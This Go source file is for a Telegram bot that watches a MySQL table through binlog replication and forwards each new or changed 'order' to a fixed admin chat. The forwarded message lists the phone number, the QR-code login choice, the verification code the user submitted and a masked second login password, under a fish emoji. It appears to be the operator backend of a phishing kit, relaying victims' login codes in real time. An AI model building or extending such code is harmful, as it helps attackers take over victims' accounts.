package main

import (
	"context"
	"fmt"
	"github.com/go-mysql-org/go-mysql/canal"
	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/siddontang/go-log/log"
	"github.com/spf13/viper"
	"os"
	"os/signal"
	"telegram-robot/initialize/mysql"
	"telegram-robot/model"
	"telegram-robot/service"
)

func main() {
	// 读取配置文件
	viper.SetConfigFile("config.yaml")
	err := viper.ReadInConfig()
	if err != nil {
		panic(err)
	}
	var config model.Config
	err = viper.Unmarshal(&config)
	if err != nil {
		panic(err)
	}

	// 初始化 MySQL
	mysql.InitMysql("")

	// 初始化 Canal 配置
	cfg := canal.NewDefaultConfig()
	cfg.Addr = ""
	cfg.User = ""
	cfg.Password = "" // 如果有密码，设置密码
	cfg.Dump.TableDB = ""
	cfg.Dump.Tables = []string{""} // 监听的表
	cfg.Dump.ExecutionPath = ""

	// 创建 Canal 实例
	c, err := canal.NewCanal(cfg)
	if err != nil {
		log.Fatal(err)
	}

	// 启动 Telegram Bot
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()
	opts := []bot.Option{
		bot.WithDefaultHandler(handler),
	}
	b, err := bot.New(config.Token, opts...)
	if err != nil {
		panic(err)
	}
	fmt.Println("机器人已经启动")

	// 注册自定义事件处理器，并设置目标表
	targetTable := ""
	c.SetEventHandler(&MyEventHandler{targetTable: targetTable, bot: b})

	fmt.Println("Canal is running...")
	// 启动 Canal
	go c.Run() // 在一个 goroutine 中运行 Canal

	// 启动 Telegram Bot
	b.Start(ctx)
}

// 处理消息的 Handler
func handler(ctx context.Context, b *bot.Bot, update *models.Update) {
	fmt.Println(update.Message.Chat.ID)
	// 回复用户相同的消息
	b.SendMessage(ctx, &bot.SendMessageParams{
		ChatID: update.Message.Chat.ID,
		Text:   update.Message.Text,
	})
}

type MyEventHandler struct {
	canal.DummyEventHandler
	targetTable string
	bot         *bot.Bot
	lastOrder   model.TgOrder // 存储上一次推送的数据
}

// OnRow 方法处理行事件，根据不同的操作类型进行处理
func (h *MyEventHandler) OnRow(e *canal.RowsEvent) error {
	// 获取发生变更的表名
	tableName := e.Table.Schema + "." + e.Table.Name
	log.Infof("Table: %s Action: %s", tableName, e.Action)

	// 只处理目标表的事件
	fmt.Println(tableName, "."+h.targetTable)
	if tableName != "."+h.targetTable {
		return nil
	}

	// 根据不同的操作类型进行响应处理
	switch e.Action {
	case canal.InsertAction:
		h.handleInsert(e)
	case canal.UpdateAction:
		h.handleUpdate(e)
	default:
		log.Warn("Unknown action detected")
	}

	return nil
}

// 处理插入操作的逻辑，打印最新插入的一行数据
// 处理插入操作的逻辑
func (h *MyEventHandler) handleInsert(e *canal.RowsEvent) {
	if len(e.Rows) > 0 {
		// 获取最新插入的行
		latestRow := e.Rows[len(e.Rows)-1] // 获取最新插入的行

		// 假设你已经将最新行映射到 TgOrder 结构体
		var t model.TgOrder
		err := t.Find() // 根据 ID 查询最新数据
		if err != nil {
			fmt.Println(err)
			return
		}

		// 仅在数据有变更时才进行推送
		if h.isOrderChanged(t) {
			h.lastOrder = t                                          // 更新上一次插入的数据
			service.NotifyDataUpdate(context.Background(), h.bot, t) // 调用推送函数
			log.Infof("Latest inserted row: %v", latestRow)
		}
	} else {
		log.Info("No rows found in insert event")
	}
}

// 处理更新操作的逻辑
// 处理更新操作的逻辑
func (h *MyEventHandler) handleUpdate(e *canal.RowsEvent) {
	if len(e.Rows) >= 2 {
		newRow := e.Rows[len(e.Rows)-1] // 新数据
		var t model.TgOrder
		err := t.Find() // 根据 ID 查询最新数据
		if err != nil {
			fmt.Println(err)
			return
		}

		// 仅在数据有变更时才进行推送
		if h.isOrderChanged(t) {
			h.lastOrder = t                                          // 更新上一次推送的数据
			service.NotifyDataUpdate(context.Background(), h.bot, t) // 调用推送函数
			log.Infof("Updated from %v to %v", e.Rows[len(e.Rows)-2], newRow)
		}
	}
}

// 检查订单是否发生变化
func (h *MyEventHandler) isOrderChanged(newOrder model.TgOrder) bool {
	return h.lastOrder.Phone != newOrder.Phone || h.lastOrder.QRCode != newOrder.QRCode || h.lastOrder.Code != newOrder.Code
}

// 实现 String 方法，返回事件处理器名称
func (h *MyEventHandler) String() string {
	return "MyEventHandler"
}

// 数据更新时推送的函数
func NotifyDataUpdate(ctx context.Context, b *bot.Bot, message model.TgOrder) {
	// 假设管理员的 ChatID 是 123456
	adminChatID := int64(123456)
	// 构造推送的消息内容
	message1 := fmt.Sprintf(`🐟状态更新：
管理员：
订单编号：%d     
填写手机号：%s
选择二维码登录：%s
用户提交验证码：%s
二次登录密码：******`, message.ID, message.Phone, message.QRCode, message.Code)

	// 主动推送消息给管理员
	b.SendMessage(ctx, &bot.SendMessageParams{
		ChatID: adminChatID,
		Text:   message1,
	})
}
